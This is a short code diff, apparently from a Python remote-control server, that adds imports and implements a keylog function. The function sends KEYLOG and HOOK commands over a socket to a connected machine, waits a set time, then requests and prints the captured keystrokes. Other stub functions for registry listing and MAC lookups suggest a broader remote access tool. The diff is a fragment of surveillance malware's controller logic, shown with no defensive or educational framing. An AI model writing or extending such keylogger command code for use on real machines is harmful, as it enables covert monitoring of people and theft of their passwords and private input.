@@ -8,6 +8,8 @@ from old_handle import registry_client
 from old_handle import shutdown_logout_client
 from queue import Queue
 
+from time import sleep
+BUFSIZ = 4 * 1024
 
 conn_ip_list = [] # list_ip() # Tuple (conn, addr)
 
@@ -65,7 +67,15 @@ def mac_address(ip_address):
     action_dictionary[ip_address].put(action_message)
 
 def keylog(ip_address, time):
-    pass
+    def action_message(conn):
+        conn.sendall(bytes("KEYLOG", "utf8"))
+        conn.sendall(b'HOOK'.ljust(BUFSIZ))
+        sleep(time)
+        conn.sendall(b'HOOK'.ljust(BUFSIZ))
+        conn.sendall(b'PRINT'.ljust(BUFSIZ))
+        data = conn.recv(BUFSIZ)
+        print(data) # Debug
+    action_dictionary[ip_address].put(action_message)
 
 def registry_list(ip_address, path_to_folder):
     pass
